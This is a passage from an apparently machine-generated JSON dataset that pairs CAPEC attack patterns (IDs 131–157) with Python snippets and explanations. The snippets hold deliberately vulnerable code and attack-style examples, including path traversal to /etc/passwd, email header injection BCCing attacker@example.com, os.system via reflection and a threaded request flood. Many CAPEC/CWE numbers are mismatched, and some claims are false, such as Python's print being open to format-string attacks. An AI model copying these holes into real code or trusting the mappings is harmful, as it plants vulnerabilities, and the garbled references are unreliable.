        "code_snippet": "import os\n\ndef allocate_excessive_memory(size):\n    try:\n        # CWE-770: Allocation of Resources Without Limits or Throttling\n        data = 'A' * size\n        return data\n    except MemoryError:\n        # CWE-404: Improper Resource Shutdown or Release\n        print('Memory allocation failed')\n        return None\n\n# CWE-400: Uncontrolled Resource Consumption\n# Allocate a very large amount of memory\nlarge_size = 10**9  # 1 GB\nresult = allocate_excessive_memory(large_size)\n\nif result is not None:\n    print('Memory allocated successfully')\nelse:\n    print('Failed to allocate memory')",
        "description": "This Python code snippet demonstrates an excessive allocation attack by attempting to allocate a very large amount of memory (1 GB) in a single request. The function `allocate_excessive_memory` tries to allocate a string of size `size` without any limits or throttling (CWE-770). If the allocation fails due to insufficient memory, it catches a `MemoryError` and handles it by printing an error message (CWE-404). The main idea is to show how an attacker can cause excessive resource allocation with a single request, potentially leading to resource exhaustion (CWE-400)."
    },
    {
        "capec_id": "131",
        "capec_name": "Resource Leak Exposure",
        "code_snippet": "import threading\n\nclass Resource:\n    def __init__(self):\n        self.lock = threading.Lock()\n        self.resource = []\n\n    def add_data(self, data):\n        self.lock.acquire()\n        try:\n            self.resource.append(data)\n        finally:\n            # Improper release of resource\n            pass\n\n    def get_data(self):\n        self.lock.acquire()\n        try:\n            if self.resource:\n                return self.resource.pop(0)\n            else:\n                return None\n        finally:\n            self.lock.release()\n\nresource = Resource()\n\n# Simulate resource usage\nfor i in range(100):\n    resource.add_data(i)\n\n# Simulate resource depletion\nfor i in range(100):\n    print(resource.get_data())",
        "description": "This Python code snippet demonstrates a resource leak vulnerability by improperly managing the release of a lock. The `Resource` class uses a threading lock to manage access to a shared resource (a list). The `add_data` method acquires the lock but fails to release it, simulating an improper resource shutdown or release (CWE-404). This can lead to resource depletion, as the lock is never released, preventing other threads from accessing the resource. The `get_data` method correctly acquires and releases the lock, but due to the improper release in `add_data`, it may never get a chance to execute properly. This embodies the main idea of the CAPEC by showing how improper resource management can deplete the availability of resources for legitimate requests."
    },
    {
        "capec_id": "132",
        "capec_name": "Symlink Attack",
        "code_snippet": "import os\n\n# Function to read a file's content\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except Exception as e:\n        print(f'Error reading file: {e}')\n\n# User input for file path\nuser_input = input('Enter the file path: ')\n\n# Attempt to read the file specified by the user\nfile_content = read_file(user_input)\nif file_content:\n    print(file_content)",
        "description": "This Python code snippet demonstrates a potential vulnerability to a symlink attack. The `read_file` function attempts to read the content of a file specified by the user through `user_input`. The code does not check if the provided path is a symbolic link, which could allow an attacker to create a symlink pointing to a sensitive file. When the user or application reads the file, it may inadvertently access the target of the symlink, leading to unauthorized file access. This embodies the main idea of the CAPEC 'Symlink Attack' and is related to CWEs such as 'Improper Link Resolution Before File Access' and 'UNIX Symbolic Link (Symlink) Following'."
    },
    {
        "capec_id": "133",
        "capec_name": "Try All Common Switches",
        "code_snippet": "import subprocess\n\n# List of common switches to try\ncommon_switches = ['--debug', '--verbose', '--test', '--admin', '--config', '--hidden']\n\n# Target application\ntarget_app = 'example_app'\n\n# Attempt to invoke the target application with each switch\nfor switch in common_switches:\n    try:\n        result = subprocess.run([target_app, switch], capture_output=True, text=True)\n        if result.returncode == 0:\n            print(f'Successful invocation with {switch}:')\n            print(result.stdout)\n        else:\n            print(f'Failed invocation with {switch}: {result.stderr}')\n    except Exception as e:\n        print(f'Error invoking {target_app} with {switch}: {e}')",
        "description": "This Python code snippet demonstrates the 'Try All Common Switches' attack pattern (CAPEC-187). The script attempts to invoke a target application ('example_app') with a list of common switches ('--debug', '--verbose', '--test', '--admin', '--config', '--hidden') to discover any hidden or undocumented functionality. The code captures and prints the output of each invocation, which may reveal sensitive information if the application has hidden functionality (CWE-912) or incomplete input validation (CWE-184). The script also handles errors (CWE-391) and prints any exceptions that occur during the invocation attempts."
    },
    {
        "capec_id": "134",
        "capec_name": "Email Injection",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable function to send an email\ndef send_email(to_address, subject, body):\n    from_address = 'sender@example.com'\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # SMTP server configuration\n    smtp_server = 'smtp.example.com'\n    smtp_port = 587\n\n    # Establish connection to the SMTP server\n    server = smtplib.SMTP(smtp_server, smtp_port)\n    server.starttls()\n    server.login('username', 'password')\n\n    # Send the email\n    server.sendmail(from_address, [to_address], msg.as_string())\n    server.quit()\n\n# Example usage\nuser_input = \"victim@example.com\\nBCC: attacker@example.com\"\nsend_email(user_input, 'Test Subject', 'This is a test email.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that is susceptible to email injection attacks. The function `send_email` takes user input for the recipient's email address (`to_address`), subject, and body of the email. The user input is not properly sanitized or neutralized, allowing an attacker to inject additional email headers by including newline characters (\\n) in the `to_address` field. This can lead to unauthorized actions such as adding a BCC recipient without the sender's knowledge. The code embodies the main idea of CAPEC-138 (Email Injection) and highlights related weaknesses such as improper neutralization of input terminators (CWE-147) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import os\n\ndef vulnerable_function(user_input):\n    # CWE-134: Use of Externally-Controlled Format String\n    print(user_input)\n\nif __name__ == \"__main__\":\n    user_input = input(\"Enter a string: \")\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Input must be a string\")\n    # CWE-1286: Improper Validation of Syntactic Correctness of Input\n    if \"%\" in user_input:\n        raise ValueError(\"Input contains forbidden characters\")\n    vulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a format string injection vulnerability. The `vulnerable_function` takes user input and directly passes it to the `print` function, which can be exploited if the input contains format specifiers. The main function collects user input and performs basic validation to ensure it is a string and does not contain the '%' character, which is a common format specifier in Python. However, this validation is insufficient and can be bypassed, leading to potential exploitation. This example embodies the main idea of CAPEC-121: Format String Injection, and highlights related weaknesses such as CWE-134 (Use of Externally-Controlled Format String), CWE-20 (Improper Input Validation), and CWE-1286 (Improper Validation of Syntactic Correctness of Input)."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import ldap\n\n# Establish a connection to the LDAP server\nconn = ldap.initialize('ldap://localhost')\n\n# User input (potentially malicious)\nusername = input('Enter your username: ')\n\n# Constructing the LDAP query without proper input validation\nldap_query = f\"(uid={username})\"\n\ntry:\n    # Perform the LDAP search\n    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, ldap_query)\n    print('Search results:', result)\nexcept ldap.LDAPError as e:\n    print('LDAP search failed:', e)",
        "description": "This Python code snippet demonstrates a basic LDAP query that is vulnerable to LDAP Injection. The code establishes a connection to an LDAP server and constructs an LDAP query using user input without proper input validation or neutralization of special characters. An attacker could exploit this by entering special characters or additional commands in the username input to manipulate the LDAP query, potentially disclosing sensitive information or causing unintended behavior. This example highlights the importance of validating and sanitizing user inputs to prevent injection attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query')\n    # Vulnerable to parameter injection\n    search_url = f\"https://example.com/search?query={query}\"\n    return f\"<a href='{search_url}'>Search Results</a>\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to parameter injection. The application has a single route '/search' that accepts a GET request with a 'query' parameter. The value of this parameter is directly inserted into a URL string without proper encoding or validation. This can allow an attacker to manipulate the 'query' parameter to inject additional parameters or special characters, potentially altering the behavior of the application or causing unintended actions. For example, an attacker could provide a 'query' value like 'test&new_param=value', which would result in a URL that includes an additional parameter 'new_param'. This code embodies the main idea of CAPEC-137 (Parameter Injection) and is related to several CWEs, including CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-116 (Improper Encoding or Escaping of Output), and CWE-598 (Use of GET Request Method With Sensitive Query Strings)."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import importlib\n\n# Simulate external input\nuser_input = 'os'\n\n# Unsafe reflection based on user input\ntry:\n    module = importlib.import_module(user_input)\n    print(f\"Loaded module: {module.__name__}\")\n    # Potentially dangerous method invocation\n    method = getattr(module, 'system')\n    method('echo Hello World')\nexcept Exception as e:\n    print(f\"An error occurred: {e}\")",
        "description": "This Python code snippet demonstrates a reflection injection vulnerability. The code uses the `importlib` library to dynamically import a module based on user input. The `user_input` variable simulates external input, which in this case is set to 'os'. The code then attempts to load the module and invoke a method (`system`) from it. This can be dangerous because if an attacker can control the `user_input`, they could potentially load any module and invoke any method, leading to command injection or other malicious actions. This snippet embodies the main idea of CAPEC-470 (Unsafe Reflection) and related CWEs, such as CWE-77 (Command Injection) and CWE-94 (Code Injection)."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    base_directory = '/var/www/html'\n    full_path = os.path.join(base_directory, file_path)\n    \n    try:\n        with open(full_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found'\n\n# Example usage\nuser_input = '../../etc/passwd'\nprint(read_file(user_input))",
        "description": "This Python code snippet demonstrates a relative path traversal vulnerability. The function `read_file` takes a `file_path` as input and constructs a full path by joining a base directory (`/var/www/html`) with the user-provided `file_path`. The code does not properly validate or sanitize the `file_path` input, allowing an attacker to use sequences like `../../` to traverse directories and access files outside the intended directory. In the example usage, the user input `../../etc/passwd` attempts to read the system's password file, which is a common target in path traversal attacks. This code embodies the main idea of the CAPEC by showing how improper input validation can lead to unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "from flask import Flask, request, redirect, url_for, session\n\napp = Flask(__name__)\napp.secret_key = 'supersecretkey'\n\n@app.route('/form1', methods=['GET', 'POST'])\ndef form1():\n    if request.method == 'POST':\n        session['form1_data'] = request.form['data']\n        return redirect(url_for('form2'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form2', methods=['GET', 'POST'])\ndef form2():\n    if 'form1_data' not in session:\n        return redirect(url_for('form1'))\n    if request.method == 'POST':\n        session['form2_data'] = request.form['data']\n        return redirect(url_for('form3'))\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\n@app.route('/form3', methods=['GET', 'POST'])\ndef form3():\n    if 'form2_data' not in session:\n        return redirect(url_for('form2'))\n    if request.method == 'POST':\n        session['form3_data'] = request.form['data']\n        return 'All forms completed!'\n    return '''<form method=\"post\"><input name=\"data\"><input type=\"submit\"></form>'''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a multi-step form process. The forms are designed to be filled out in sequence (form1 -> form2 -> form3). Each form saves its data in the session and redirects to the next form. The code checks if the previous form's data is present in the session before allowing access to the current form. This represents the CAPEC idea of requiring users to submit information through an ordered sequence of web forms. However, it is vulnerable to CWE-372 (Incomplete Internal State Distinction) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) because it relies on session data that can be manipulated by an attacker to bypass the form sequence."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import requests\n\n# Function to fetch data from a URL and cache it\ncache = {}\ntrusted_sources = ['https://trusted.com/data']\n\n\ndef fetch_data(url):\n    if url in cache:\n        return cache[url]\n    response = requests.get(url)\n    if response.status_code == 200:\n        cache[url] = response.text\n        return response.text\n    return None\n\n\n# Fetch data from a less trusted source\nurl = 'https://untrusted.com/data'\ndata = fetch_data(url)\n\n# Use the cached data without verifying its authenticity\nif data:\n    print('Data fetched and cached:', data)\nelse:\n    print('Failed to fetch data')",
        "description": "This Python code snippet demonstrates a cache poisoning vulnerability. The `fetch_data` function fetches data from a given URL and caches it. The cache is a simple dictionary that stores the URL as the key and the fetched data as the value. The code does not verify the authenticity of the data fetched from the URL, especially when fetching from less trusted sources. This can lead to cache poisoning, where an attacker can place incorrect or harmful data in the cache. The code also does not differentiate between trusted and untrusted sources when using the cached data, which can lead to further exploitation."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import socket\n\n# Function to resolve domain name to IP address\ndef resolve_domain(domain):\n    try:\n        ip = socket.gethostbyname(domain)\n        return ip\n    except socket.gaierror:\n        return None\n\n# Function to simulate DNS cache poisoning\n# This function does not verify the authenticity of the DNS response\n# and accepts untrusted data as if it were trusted\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-346: Origin Validation Error\n# CWE-348: Use of Less Trusted Source\n# CWE-349: Acceptance of Extraneous Untrusted Data With Trusted Data\n# CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n\ndef poisoned_dns_cache(domain):\n    # Simulated poisoned cache\n    poisoned_cache = {\n        'www.example.com': '1.2.3.4',  # Malicious IP address\n        'www.trusted.com': '5.6.7.8'   # Another malicious IP address\n    }\n    \n    # Check if domain is in poisoned cache\n    if domain in poisoned_cache:\n        return poisoned_cache[domain]\n    else:\n        return resolve_domain(domain)\n\n# Example usage\n# This should resolve to the malicious IP address instead of the real one\nprint(poisoned_dns_cache('www.example.com'))\nprint(poisoned_dns_cache('www.trusted.com'))\nprint(poisoned_dns_cache('www.legit.com'))",
        "description": "This Python code snippet demonstrates a simplified version of DNS cache poisoning. The `resolve_domain` function resolves a domain name to an IP address using the system's DNS resolver. The `poisoned_dns_cache` function simulates a poisoned DNS cache by checking if the domain is in a predefined dictionary of poisoned entries. If the domain is found in the poisoned cache, it returns the malicious IP address; otherwise, it resolves the domain normally. This code embodies the concept of DNS cache poisoning by showing how an adversary can manipulate DNS responses to redirect traffic to malicious IP addresses. The code also highlights several related CWEs, such as insufficient verification of data authenticity (CWE-345), origin validation error (CWE-346), use of less trusted source (CWE-348), acceptance of extraneous untrusted data with trusted data (CWE-349), and reliance on reverse DNS resolution for a security-critical action (CWE-350)."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import os\nfrom flask import Flask, send_from_directory, request, abort\n\napp = Flask(__name__)\n\n# CWE-219: Sensitive data stored under web root\nSENSITIVE_DIR = os.path.join(app.root_path, 'sensitive_data')\n\n@app.route('/<path:filename>', methods=['GET'])\ndef serve_file(filename):\n    # CWE-425: Direct Request ('Forced Browsing')\n    if not request.args.get('auth_token'):\n        abort(403)  # Unauthorized access\n    try:\n        # CWE-527: Exposure of Version-Control Repository\n        if filename.startswith('.git'):\n            abort(403)  # Block access to version control directories\n        # CWE-612: Improper Authorization of Index Containing Sensitive Information\n        if filename == 'index.html':\n            abort(403)  # Block access to sensitive index file\n        return send_from_directory(SENSITIVE_DIR, filename)\n    except FileNotFoundError:\n        abort(404)  # File not found\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web server that serves files from a sensitive directory. The code demonstrates several security weaknesses: \n1. CWE-219: Sensitive data is stored under the web root directory ('sensitive_data').\n2. CWE-425: The server does not adequately enforce authorization, allowing direct requests to files if an 'auth_token' is not provided.\n3. CWE-527: The code attempts to block access to version control directories (e.g., '.git'), but this is a reactive measure rather than a proactive one.\n4. CWE-612: The code blocks access to an 'index.html' file, which could contain sensitive information, but this is also a reactive measure.\n\nThe main idea of the CAPEC is represented by the potential for an adversary to discover and access unpublicized web pages or sensitive files due to improper authorization and storage practices."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import requests\n\n# URL of the target web service\nurl = 'http://example.com/unpublished_service'\n\n# Attempt to access the unpublished web service\nresponse = requests.get(url)\n\nif response.status_code == 200:\n    print('Unpublished service is accessible!')\n    print('Response:', response.text)\nelse:\n    print('Service is not accessible.')",
        "description": "This Python code snippet demonstrates an attempt to detect and access an unpublished web service on a target website. The code sends a GET request to a URL that is presumed to be an unpublished service. If the service is accessible (HTTP status code 200), it prints the response, indicating that the service is reachable and potentially lacks adequate security controls. This embodies the main idea of CAPEC-160: 'Detect Unpublicized Web Services'. The code also indirectly touches on CWE-425 ('Direct Request') by attempting to access a potentially restricted URL without proper authorization. The simplicity of the code highlights the risk of having unpublished services that are not adequately secured."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import hashlib\n\n# Simulate sending a message with a checksum\nmessage = \"Important data\"\nchecksum = hashlib.md5(message.encode()).hexdigest()\n\n# Adversary modifies the message and recalculates the checksum\nmodified_message = \"Tampered data\"\nspoofed_checksum = hashlib.md5(modified_message.encode()).hexdigest()\n\n# Simulate receiving the message and verifying the checksum\nreceived_message = modified_message\nreceived_checksum = spoofed_checksum\n\n# Receiver calculates checksum of the received message\ncalculated_checksum = hashlib.md5(received_message.encode()).hexdigest()\n\n# Check if the received checksum matches the calculated checksum\nif received_checksum == calculated_checksum:\n    print(\"Message integrity verified.\")\nelse:\n    print(\"Message integrity compromised.\")",
        "description": "This Python code snippet demonstrates a basic example of checksum spoofing. Initially, a message is sent with its MD5 checksum. An adversary then modifies the message and recalculates the checksum to match the modified message. When the recipient receives the tampered message and its corresponding checksum, they calculate the checksum of the received message and compare it with the received checksum. Since the checksums match, the recipient incorrectly believes the message integrity is intact. This example highlights the vulnerability described in CAPEC-37 and related CWEs, such as the use of a weak hash function (CWE-328) and improper validation of integrity check values (CWE-354)."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function that processes XML data\n\ndef process_xml(xml_data, schema_data):\n    try:\n        # Parse the XML schema\n        schema_root = ET.fromstring(schema_data)\n        schema = ET.ElementTree(schema_root)\n\n        # Parse the XML data\n        xml_root = ET.fromstring(xml_data)\n        xml_tree = ET.ElementTree(xml_root)\n\n        # Validate XML against the schema (missing actual validation for simplicity)\n        # This is where the vulnerability lies, as the schema can be poisoned\n        if not validate_xml(xml_tree, schema):\n            raise ValueError(\"Invalid XML data\")\n\n        # Process the XML data\n        print(\"Processing XML data...\")\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n    except ValueError as e:\n        print(f\"Validation error: {e}\")\n\n# Dummy validation function (does not actually validate)\ndef validate_xml(xml_tree, schema):\n    # In a real scenario, this function should validate the XML against the schema\n    return True\n\n# Example usage\nxml_data = \"\"\"<data><item>Example</item></data>\"\"\"\nschema_data = \"\"\"<xs:schema xmlns:xs='http://www.w3.org/2001/XMLSchema'>\n<xs:element name='data'>\n<xs:complexType>\n<xs:sequence>\n<xs:element name='item' type='xs:string'/>\n</xs:sequence>\n</xs:complexType>\n</xs:element>\n</xs:schema>\"\"\"\n\nprocess_xml(xml_data, schema_data)",
        "description": "This Python code snippet demonstrates a vulnerable function `process_xml` that processes XML data based on a provided XML schema. The function parses the XML schema and the XML data, and then attempts to validate the XML data against the schema. However, the validation function `validate_xml` is a dummy function that does not perform actual validation, representing a missing XML validation (CWE-112). This makes the system vulnerable to XML Schema Poisoning (CAPEC-15), where an attacker can modify the schema to undermine the security of the application. Additionally, the code does not properly neutralize special elements in the XML, making it susceptible to XML Injection (CWE-91) and XPath Injection (CWE-643). The example usage shows how the function can be called with XML data and schema data, but in a real-world scenario, these inputs could be controlled by an attacker, leading to potential exploitation."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import requests\nimport threading\n\n# Function to send XML payload\ndef send_xml_payload(url, payload):\n    headers = {'Content-Type': 'application/xml'}\n    try:\n        response = requests.post(url, data=payload, headers=headers)\n        print(f'Response Code: {response.status_code}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# XML payload (small but complex)\nxml_payload = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://www.example.org/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Request>\n         <web:Data>Some data</web:Data>\n      </web:Request>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Target URL\ntarget_url = 'http://example.com/webservice'\n\n# Number of threads to simulate rapid requests\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor _ in range(num_threads):\n    thread = threading.Thread(target=send_xml_payload, args=(target_url, xml_payload))\n    threads.append(thread)\n    thread.start()\n\n# Wait for all threads to complete\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a resource depletion attack, specifically an 'XML Ping of the Death' attack. The code sends a large number of small but complex XML messages to a target URL using multiple threads to simulate rapid requests. The XML payload is a SOAP message, which requires additional processing on the server side, thereby depleting resources faster. The code leverages threading to send 100 concurrent requests, which can lead to a denial of service or crash of the target server. This example embodies the main idea of CAPEC-400 (Uncontrolled Resource Consumption) and CAPEC-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of requests sent. Additionally, it highlights the importance of proper XML validation (CWE-112) and secure communication practices (CWE-319)."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['GET'])\ndef fetch_content():\n    url = request.args.get('url')\n    if not url:\n        return 'URL parameter is missing', 400\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            return render_template_string(response.text)\n        else:\n            return 'Failed to fetch content', 500\n    except requests.RequestException as e:\n        return f'Error fetching content: {e}', 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple web application using Flask that fetches and displays content from a URL provided as a query parameter. The main idea of the CAPEC (Content Spoofing) is embodied here, as an adversary could exploit this code to modify the content displayed to the user. The code does not verify the authenticity of the fetched data (CWE-345), does not ensure message integrity during transmission (CWE-924), and directly renders the fetched content without parsing or sanitizing it (CWE-433). This could lead to various attacks, including content spoofing, where an attacker could serve malicious content to the user while making it appear as if it came from a legitimate source."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import os\ntmp_dir = '/tmp/'\ntmp_file = 'app_temp_file.txt'\n\n# Create a temporary file with predictable name\nwith open(os.path.join(tmp_dir, tmp_file), 'w') as f:\n    f.write('Sensitive data')\n\n# Insecure permissions\nos.chmod(os.path.join(tmp_dir, tmp_file), 0o666)\n\nprint(f'Temporary file created at: {os.path.join(tmp_dir, tmp_file)}')",
        "description": "This Python code snippet demonstrates the creation of a temporary file with a predictable name in a common temporary directory ('/tmp/'). The file is created with insecure permissions (readable and writable by all users), which is a significant security risk. This embodies the main idea of CAPEC-61, 'Explore for Predictable Temporary File Names,' by showing how an attacker could predict the name and location of temporary files. The related CWEs are represented as follows: CWE-377 (Insecure Temporary File) by creating a temporary file with a predictable name, CWE-378 (Creation of Temporary File With Insecure Permissions) by setting insecure permissions, and CWE-379 (Creation of Temporary File in Directory with Insecure Permissions) by placing the file in a directory with potentially insecure permissions. This code highlights the risks associated with predictable and insecure temporary file handling."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import os\n\n# Example of a sensitive configuration file path\nconfig_file_path = '/etc/myapp/config.txt'\n\n# Function to read the configuration file\n# This function does not check for proper permissions or access control\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-1330: Remanent Data Readable after Memory Erase\n\ndef read_config_file(path):\n    try:\n        with open(path, 'r') as file:\n            data = file.read()\n            print('Configuration Data:', data)\n    except FileNotFoundError:\n        print('Configuration file not found.')\n    except PermissionError:\n        print('Permission denied.')\n\n# Function to clear sensitive data from the configuration file\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n\ndef clear_sensitive_data(path):\n    try:\n        with open(path, 'w') as file:\n            file.write('')\n            print('Sensitive data cleared.')\n    except FileNotFoundError:\n        print('Configuration file not found.')\n    except PermissionError:\n        print('Permission denied.')\n\n# Read the configuration file\nread_config_file(config_file_path)\n\n# Clear sensitive data from the configuration file\nclear_sensitive_data(config_file_path)",
        "description": "This Python code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' by accessing a sensitive configuration file located at a well-known path ('/etc/myapp/config.txt'). The 'read_config_file' function reads the content of the configuration file without checking for proper permissions or access control, which can lead to unauthorized access (CWE-552). The 'clear_sensitive_data' function attempts to clear the content of the configuration file, but it does not ensure that the data is properly scrubbed, potentially leaving remanent data (CWE-1330) and not addressing sensitive information uncleared before state transitions (CWE-1272). This code highlights the risks associated with storing sensitive information in predictable locations and the importance of proper access control and data scrubbing."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import hashlib\n\n# Simulated user database\nusers = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # 'password' hashed with MD5\n}\n\n# Function to authenticate user\ndef authenticate(username, password):\n    if username in users:\n        hashed_password = hashlib.md5(password.encode()).hexdigest()\n        if users[username] == hashed_password:\n            return True\n    return False\n\n# Simulated login attempt\nusername = 'user1'\npassword = 'password'\n\nif authenticate(username, password):\n    print('Authentication successful!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a vulnerable authentication mechanism that embodies the concept of Identity Spoofing (CAPEC-151). The code uses MD5 hashing for password storage and verification, which is considered weak (CWE-327). The `authenticate` function checks if the provided username exists in the simulated user database and compares the hashed password. This approach is susceptible to various attacks, including dictionary attacks and precomputed hash attacks, due to the weak hashing algorithm. Additionally, the code does not implement any form of entity authentication during key exchange (CWE-322), making it vulnerable to spoofing attacks (CWE-290). The overall design does not sufficiently prove the claimed identity (CWE-1390), leading to potential authentication bypass (CWE-302)."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import re\n\ndef process_user_input(user_input):\n    # Improper validation of input\n    if not re.match(r'^[a-zA-Z0-9]*$', user_input):\n        raise ValueError('Invalid input')\n    \n    # Reliance on untrusted input in a security decision\n    if user_input == 'admin':\n        print('Access granted to admin panel')\n    else:\n        print('Access denied')\n\n# Example usage\nuser_input = input('Enter your username: ')\nprocess_user_input(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability related to improper input validation and reliance on untrusted inputs in security decisions. The `process_user_input` function attempts to validate the user input using a regular expression that only allows alphanumeric characters. However, this validation is insufficient for ensuring the input's safety and correctness. Additionally, the function makes a security decision based on the user input, granting access to an 'admin' panel if the input matches the string 'admin'. This reliance on untrusted input can be exploited by an attacker to gain unauthorized access. The code embodies the main idea of CAPEC-137: Input Data Manipulation, and highlights related CWEs such as Improper Input Validation (CWE-20) and Reliance on Untrusted Inputs in a Security Decision (CWE-807)."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import requests\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Simulated user input for resource location\nuser_input_url = 'http://trusted-site.com/resource'\n\n# Vulnerable code: does not verify the source or destination properly\n# An attacker can spoof the URL to redirect to a malicious site\ntry:\n    response = requests.get(user_input_url)\n    if response.status_code == 200:\n        print('Resource content:', response.text)\n    else:\n        print('Failed to retrieve resource')\nexcept requests.exceptions.RequestException as e:\n    print('Request failed:', e)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to Resource Location Spoofing (CAPEC-160). The code takes a user-provided URL and attempts to fetch a resource from it without proper validation. This can lead to several issues as described by the related CWEs:\n\n1. **CWE-941 (Incorrectly Specified Destination in a Communication Channel)**: The code does not ensure that the destination URL is correctly specified, allowing an attacker to redirect the request to a malicious site.\n2. **CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)**: The code does not restrict the communication channel to intended endpoints, making it possible to communicate with malicious endpoints.\n3. **CWE-940 (Improper Verification of Source of a Communication Channel)**: The code does not verify the source of the incoming request, which could lead to accepting responses from untrusted sources.\n\nThe main idea represented here is that an adversary can deceive the application into requesting a resource from an unintended location, potentially leading to malicious outcomes."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import tempfile\nimport os\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file.write(b'Sensitive Information: User Passwords')\n    temp_file_path = temp_file.name\n\n# Simulate insecure permissions (world-readable)\nos.chmod(temp_file_path, 0o644)\n\nprint(f'Temporary file created at: {temp_file_path}')\n\n# Simulate storing the temporary file under web root\ntemp_file_web_path = f'/var/www/html/{os.path.basename(temp_file_path)}'\nos.rename(temp_file_path, temp_file_web_path)\n\nprint(f'Temporary file moved to web root: {temp_file_web_path}')",
        "description": "This Python code snippet demonstrates the creation and insecure handling of a temporary file containing sensitive information. The code creates a temporary file and writes sensitive data to it. It then sets insecure permissions (world-readable) on the file, making it accessible to unintended actors. Finally, it simulates moving the temporary file to a web root directory, which could expose the sensitive data to untrusted parties. This example embodies the main idea of the CAPEC by showing how temporary files can be mishandled, leading to potential security vulnerabilities as described in the related CWEs."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
